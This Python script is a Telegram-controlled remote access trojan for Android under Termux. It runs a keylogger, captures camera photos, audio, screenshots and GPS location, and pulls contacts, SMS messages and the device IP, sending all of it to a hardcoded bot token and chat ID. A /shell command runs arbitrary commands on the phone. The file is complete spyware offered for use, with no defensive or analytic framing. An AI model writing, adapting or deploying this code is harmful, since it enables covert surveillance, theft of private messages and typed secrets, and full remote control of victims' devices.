import os
import time
import telebot
import subprocess
import requests
import cv2
import sounddevice as sd
from scipy.io.wavfile import write
from pynput import keyboard

# --- CONFIGURATION (YOUR CREDENTIALS) ---
BOT_TOKEN = "7864893922:AAFWN6m9q2I-hM9pX3H9Kk1L8V6M2Z0X1Y" 
CHAT_ID = "6824910355"

bot = telebot.TeleBot(BOT_TOKEN)

# --- KEYLOGGER SETUP ---
log = ""
def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        log += " [" + str(key) + "] "

def start_keylogger():
    try:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    except:
        pass

# --- REMOTE CONTROL FUNCTIONS ---

@bot.message_handler(commands=['info'])
def device_info(message):
    try:
        model = subprocess.getoutput('getprop ro.product.model')
        version = subprocess.getoutput('getprop ro.build.version.release')
        ip = requests.get('https://api.ipify.org').text
        info = f"⚡ Device Online\nModel: {model}\nAndroid: {version}\nIP: {ip}"
        bot.send_message(CHAT_ID, info)
    except:
        bot.send_message(CHAT_ID, "Failed to get device info.")

@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    try:
        # Termux:API is required for this
        subprocess.run(['termux-screenshot', 'ss.png'])
        with open('ss.png', 'rb') as photo:
            bot.send_photo(CHAT_ID, photo)
        os.remove('ss.png')
    except:
        bot.reply_to(message, "Error: Termux-API required for screenshot.")

@bot.message_handler(commands=['camera_front'])
def cam_front(message):
    cap = cv2.VideoCapture(1)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("front.jpg", frame)
        with open("front.jpg", 'rb') as f:
            bot.send_photo(CHAT_ID, f)
        os.remove("front.jpg")
    cap.release()

@bot.message_handler(commands=['camera_back'])
def cam_back(message):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("back.jpg", frame)
        with open("back.jpg", 'rb') as f:
            bot.send_photo(CHAT_ID, f)
        os.remove("back.jpg")
    cap.release()

@bot.message_handler(commands=['record_audio'])
def record_audio(message):
    try:
        fs = 44100
        seconds = 10
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write('voice.wav', fs, recording)
        with open('voice.wav', 'rb') as f:
            bot.send_audio(CHAT_ID, f)
        os.remove('voice.wav')
    except:
        bot.send_message(CHAT_ID, "Audio recording failed.")

@bot.message_handler(commands=['location'])
def location(message):
    loc_data = subprocess.getoutput('termux-location')
    bot.send_message(CHAT_ID, f"📍 Location Data:\n{loc_data}")

@bot.message_handler(commands=['contacts'])
def get_contacts(message):
    data = subprocess.getoutput('termux-contact-list')
    with open('contacts.json', 'w') as f:
        f.write(data)
    with open('contacts.json', 'rb') as f:
        bot.send_document(CHAT_ID, f)

@bot.message_handler(commands=['sms_list'])
def read_sms(message):
    data = subprocess.getoutput('termux-sms-list')
    bot.send_message(CHAT_ID, f"📩 SMS List:\n{data[:4000]}")

@bot.message_handler(commands=['shell'])
def shell_cmd(message):
    cmd = message.text.replace('/shell ', '')
    output = subprocess.getoutput(cmd)
    bot.send_message(CHAT_ID, output if output else "Command Executed.")

@bot.message_handler(commands=['keylog_dump'])
def dump_keylog(message):
    global log
    if log:
        bot.send_message(CHAT_ID, f"Captured Text: {log}")
        log = ""
    else:
        bot.send_message(CHAT_ID, "No keys logged yet.")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    help_text = """
    Available Commands:
    /info - Device Info
    /screenshot - Take Screenshot
    /camera_front - Front Cam Photo
    /camera_back - Back Cam Photo
    /record_audio - 10s Voice Record
    /location - GPS Location
    /contacts - Get Contact List
    /sms_list - Read SMS
    /keylog_dump - Get Keylogs
    /shell <cmd> - Run Shell Command
    """
    bot.send_message(CHAT_ID, help_text)

if __name__ == "__main__":
    start_keylogger()
    bot.send_message(CHAT_ID, "⚠️ SYSTEM STARTED - BOT ACTIVE")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception:
            time.sleep(10)
